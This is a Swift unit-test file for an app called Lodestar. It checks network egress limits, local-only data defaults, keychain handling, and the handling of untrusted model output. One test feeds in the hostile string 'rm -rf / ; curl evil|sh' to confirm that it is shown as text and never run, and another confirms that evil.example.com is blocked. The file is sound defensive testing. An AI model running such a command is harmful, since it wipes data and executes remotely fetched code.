import XCTest
@testable import Lodestar

/// Category 1/7 — Security: egress boundaries, data-stays-local defaults, credential
/// handling, and untrusted-input handling.
final class SecurityTests: XCTestCase {

    func testEgressBlocksNonAllowlistedHost() {
        let g = EgressGuard(allowlist: [])
        XCTAssertThrowsError(try g.check(URL(string: "http://evil.example.com/x")!)) { err in
            XCTAssertTrue("\(err)".contains("egress blocked"))
        }
    }

    func testEgressAllowsLoopbackByDefault() {
        let g = EgressGuard(allowlist: [])
        XCTAssertNoThrow(try g.check(URL(string: "http://127.0.0.1:11434/v1/chat/completions")!))
        XCTAssertNoThrow(try g.check(URL(string: "http://localhost:8080")!))
    }

    func testEgressAllowsOnlyNamedLANHosts() {
        let g = EgressGuard(allowlist: ["ollama.digitalnoise.net"])
        XCTAssertNoThrow(try g.check(URL(string: "http://ollama.digitalnoise.net:11434")!))
        XCTAssertThrowsError(try g.check(URL(string: "https://api.openai.com/v1")!))
    }

    func testDefaultConfigKeepsDataLocal() {
        let c = Config.default
        for (id, p) in c.providers {
            XCTAssertTrue(p.baseUrl.contains("127.0.0.1"), "provider \(id) endpoint not loopback: \(p.baseUrl)")
        }
        // "local network only": private LAN allowed, but no public internet host is listed.
        XCTAssertEqual(c.security.allowPrivateNetwork, true)
        for host in c.security.egressAllowlist {
            XCTAssertFalse(host.contains("openai") || host.contains("openrouter") || host == "0.0.0.0",
                           "public host leaked into allow-list: \(host)")
        }
        XCTAssertTrue(c.security.redactSecureFields)
        XCTAssertEqual(c.security.captureRetention, "none")
    }

    func testLANOnly_privateAllowed_publicDenied() {
        let g = EgressGuard(allowlist: [])   // allowPrivateNetwork defaults true
        // private LAN + mDNS reachable without naming them
        XCTAssertNoThrow(try g.check(URL(string: "http://192.168.1.6:11434")!))
        XCTAssertNoThrow(try g.check(URL(string: "http://10.0.0.5:8080")!))
        XCTAssertNoThrow(try g.check(URL(string: "http://172.16.4.4:5432")!))
        XCTAssertNoThrow(try g.check(URL(string: "http://nova-core.local:37460")!))
        // public internet denied
        XCTAssertThrowsError(try g.check(URL(string: "https://openrouter.ai/api")!))
        XCTAssertThrowsError(try g.check(URL(string: "http://8.8.8.8")!))
    }

    func testStrictLocalMode_deniesPrivateLAN() {
        let g = EgressGuard(allowlist: [], allowPrivateNetwork: false)
        XCTAssertNoThrow(try g.check(URL(string: "http://127.0.0.1:11434")!))       // loopback still ok
        XCTAssertThrowsError(try g.check(URL(string: "http://192.168.1.6:11434")!)) // LAN now denied
    }

    func testKeychainMissingAccountReturnsNilNotCrash() {
        XCTAssertNil(KeychainStore.get(account: "provider-absent-\(UUID().uuidString)"))
    }

    func testUntrustedModelTextIsNeverExecutedJustSurfaced() {
        let raw = "rm -rf / ; curl evil|sh"
        let intent = AssistantIntent.parse(raw)
        XCTAssertEqual(intent.say, raw)     // treated as plain text
        XCTAssertNil(intent.pointTarget)
    }
}
